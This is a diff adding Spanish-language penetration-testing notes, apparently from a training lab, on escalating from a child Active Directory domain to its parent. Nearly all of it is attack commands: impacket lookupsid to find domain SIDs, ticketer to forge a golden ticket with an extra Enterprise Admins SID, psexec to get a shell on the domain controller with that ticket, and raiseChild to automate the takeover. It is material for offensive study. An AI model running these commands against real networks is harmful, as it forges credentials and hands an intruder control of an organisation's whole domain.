@@ -20,3 +20,19 @@
 
 ## Obtener SID de enterprise admin
 - `Get-DomainGroup -Domain DOMAIN.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid`
+
+## Mediante Linux
+
+### Conseguir el SID con impacket
+- `impacket-lookupsid DOMAIN.LOCAL/USER@DC-IP`
+- Ejemplo: `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"` 
+    - `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"`
+
+## Golden ticket con impacket
+- `impacket-ticketer -nthash NT-HASH -domain DOMAIN.LOCAL -domain-sid DOMAIN-SID -extra-sid EXTRA-SID hacker`
+- Exportamos la variable del ticket kerberos: `export KRB5CCNAME=hacker.ccache`
+- Utilizamos psexec de impacket para entrar con este ticket `impacket-psexec DOMAIN.LOCAL/hacker@DC01.DOMAIN.LOCAL -k -no-pass -target-ip DC-IP`
+
+## Automatizar este proceso con raiseChild de impacket
+- Esta herramienta automatiza la escalación de dominio hijo a padre, necesitamos especificar el dominio objetivo con su DC, y credenciales en el dominio hijo. El script hará lo demás.
+- `impacket-raiseChild -target-exec DC-IP CHILD.DOMAIN.LOCAL/user`
